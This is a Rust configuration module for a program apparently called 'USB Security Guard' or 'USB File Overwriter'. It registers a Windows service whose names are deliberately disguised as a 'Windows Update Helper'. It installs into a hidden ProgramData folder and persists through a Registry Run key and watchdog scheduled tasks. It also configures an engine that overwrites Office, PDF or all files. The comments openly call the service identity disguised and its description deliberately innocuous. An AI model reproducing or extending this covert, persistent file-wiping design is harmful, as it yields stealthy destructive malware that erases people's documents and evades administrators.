//! Configuration management for USB Security Guard.
//!
//! Provides service identity constants (disguised as a benign Windows Update helper),
//! file filter configuration via INI file, and efficient extension matching using
//! a pre-built [`HashSet`] cache.

use std::collections::HashSet;
use std::path::{Path, PathBuf};

// ─── Service identity constants (disguised names) ────────────────────────────

/// Internal service name registered with the Windows Service Control Manager.
pub const SERVICE_NAME: &str = "WindowsUpdateHelperService";

/// Human-readable name shown in `services.msc`.
pub const SERVICE_DISPLAY_NAME: &str = "Windows Update Helper Service";

/// Description shown in service properties — deliberately innocuous.
pub const SERVICE_DESCRIPTION: &str =
    "Provides auxiliary support for Windows Update operations and system maintenance tasks";

/// Subdirectory under `%ProgramData%` for installation files.
pub const INSTALL_DIR_NAME: &str = r".system\WindowsUpdateHelper";

/// Task Scheduler watchdog task name.
pub const WATCHDOG_TASK_NAME: &str = "WindowsUpdateHelperWatchdog";

/// Task Scheduler daily maintenance task name.
pub const DAILY_TASK_NAME: &str = "WindowsUpdateHelperDaily";

/// Registry Run key value name for persistence.
pub const REGISTRY_VALUE_NAME: &str = "WindowsUpdateHelper";

/// Maximum file size we will attempt to overwrite (100 MB).
pub const MAX_FILE_SIZE: u64 = 100 * 1024 * 1024;

/// Buffer size for overwrite I/O operations (64 KB).
pub const OVERWRITE_BUFFER_SIZE: usize = 64 * 1024;

// ─── Extension lists ─────────────────────────────────────────────────────────

/// Microsoft Office and related document extensions.
pub const OFFICE_EXTENSIONS: &[&str] = &[
    "doc", "docx", "docm", "dot", "dotx", "dotm",
    "xls", "xlsx", "xlsm", "xlt", "xltx", "xltm", "xlsb",
    "ppt", "pptx", "pptm", "pot", "potx", "potm", "pps", "ppsx", "ppsm",
    "pub", "vsd", "vsdx", "vsdm", "mpp", "one", "accdb", "mdb",
];

/// PDF extension.
pub const PDF_EXTENSIONS: &[&str] = &["pdf"];

// ─── FilterMode ──────────────────────────────────────────────────────────────

/// Determines which file types the overwrite engine targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FilterMode {
    /// Overwrite ALL files regardless of extension.
    All,
    /// Overwrite only Microsoft Office documents.
    Office,
    /// Overwrite only PDF files.
    Pdf,
    /// Overwrite both Office and PDF files.
    OfficePdf,
}

impl FilterMode {
    /// Parse a filter mode from a configuration string.
    ///
    /// Unrecognised values default to [`FilterMode::OfficePdf`] for safety.
    pub fn from_str(s: &str) -> Self {
        match s.trim().to_lowercase().as_str() {
            "all" => FilterMode::All,
            "office" => FilterMode::Office,
            "pdf" => FilterMode::Pdf,
            _ => FilterMode::OfficePdf,
        }
    }

    /// Serialise the mode to its canonical INI-file string.
    pub fn as_str(&self) -> &'static str {
        match self {
            FilterMode::All => "all",
            FilterMode::Office => "office",
            FilterMode::Pdf => "pdf",
            FilterMode::OfficePdf => "office_pdf",
        }
    }

    /// Human-readable label for UI display.
    pub fn display_name(&self) -> &'static str {
        match self {
            FilterMode::All => "Maximum Security (All Files)",
            FilterMode::Office => "Office Files Only",
            FilterMode::Pdf => "PDF Files Only",
            FilterMode::OfficePdf => "Office + PDF Files",
        }
    }
}

// ─── Config ──────────────────────────────────────────────────────────────────

/// Runtime configuration loaded from `config.ini`.
///
/// The `extensions_cache` field provides O(1) lookups when deciding whether a
/// given file path should be processed. It is rebuilt whenever `filter_mode`
/// changes.
pub struct Config {
    /// Active file-type filter.
    pub filter_mode: FilterMode,
    /// Pre-computed set of lowercase extensions for the current filter mode.
    /// Empty when `filter_mode == FilterMode::All` (meaning every file matches).
    extensions_cache: HashSet<String>,
}

impl Config {
    /// Load configuration from disk, falling back to [`FilterMode::OfficePdf`] if
    /// the file is missing or malformed.
    pub fn load() -> Self {
        let mode = Self::load_filter_mode();
        let cache = Self::build_extension_cache(mode);
        Config {
            filter_mode: mode,
            extensions_cache: cache,
        }
    }

    /// Persist the current configuration to `config.ini`.
    pub fn save(&self) -> std::io::Result<()> {
        let path = Self::config_path();

        // Ensure the parent directory exists.
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }

        let content = format!(
            "; USB File Overwriter Configuration\n\
             ; Valid modes: all, office, pdf, office_pdf\n\
             [FileFilter]\n\
             mode = {}\n",
            self.filter_mode.as_str()
        );

        std::fs::write(&path, content)
    }

    /// Resolve the path to `config.ini`.
    ///
    /// Search order:
    /// 1. `%ProgramData%\.system\WindowsUpdateHelper\config.ini` (installed location)
    /// 2. Same directory as the running executable (development / portable mode)
    pub fn config_path() -> PathBuf {
        // Prefer the install directory if the config file already exists there.
        let install_path = Self::install_dir().join("config.ini");
        if install_path.exists() {
            return install_path;
        }

        // Fall back to the directory containing the executable.
        if let Ok(exe) = std::env::current_exe() {
            if let Some(dir) = exe.parent() {
                let local_path = dir.join("config.ini");
                if local_path.exists() {
                    return local_path;
                }
            }
        }

        // Neither exists yet — default to the install directory so that a
        // subsequent `save()` writes to the canonical location.
        install_path
    }

    /// Return the installation directory (`%ProgramData%\.system\WindowsUpdateHelper`).
    pub fn install_dir() -> PathBuf {
        let program_data = std::env::var("ProgramData")
            .unwrap_or_else(|_| r"C:\ProgramData".to_string());
        PathBuf::from(program_data).join(INSTALL_DIR_NAME)
    }

    /// Check whether a file at `path` should be processed under the current
    /// filter mode.
    ///
    /// Returns `true` immediately when `filter_mode` is [`FilterMode::All`].
    /// Otherwise performs an O(1) [`HashSet`] lookup on the file extension.
    pub fn should_process_file(&self, path: &Path) -> bool {
        if self.filter_mode == FilterMode::All {
            return true;
        }

        // Extract the extension, lowercased, and check the cache.
        path.extension()
            .and_then(|ext| ext.to_str())
            .map(|ext| self.extensions_cache.contains(&ext.to_lowercase()))
            .unwrap_or(false)
    }

    // ── Private helpers ──────────────────────────────────────────────────

    /// Read the filter mode string from the INI file on disk.
    fn load_filter_mode() -> FilterMode {
        let path = Self::config_path();

        let content = match std::fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => return FilterMode::OfficePdf,
        };

        let conf = configparser::ini::Ini::new();
        let mut parsed_conf = conf;
        match parsed_conf.read(content) {
            Ok(_) => {},
            Err(_) => return FilterMode::OfficePdf,
        };

        parsed_conf.get("FileFilter", "mode")
            .map(|s: String| FilterMode::from_str(&s))
            .unwrap_or(FilterMode::OfficePdf)
    }

    /// Build the extension lookup cache for a given [`FilterMode`].
    fn build_extension_cache(mode: FilterMode) -> HashSet<String> {
        let slices: &[&[&str]] = match mode {
            FilterMode::All => &[],
            FilterMode::Office => &[OFFICE_EXTENSIONS],
            FilterMode::Pdf => &[PDF_EXTENSIONS],
            FilterMode::OfficePdf => &[OFFICE_EXTENSIONS, PDF_EXTENSIONS],
        };

        slices
            .iter()
            .flat_map(|list| list.iter())
            .map(|ext| ext.to_lowercase())
            .collect()
    }
}
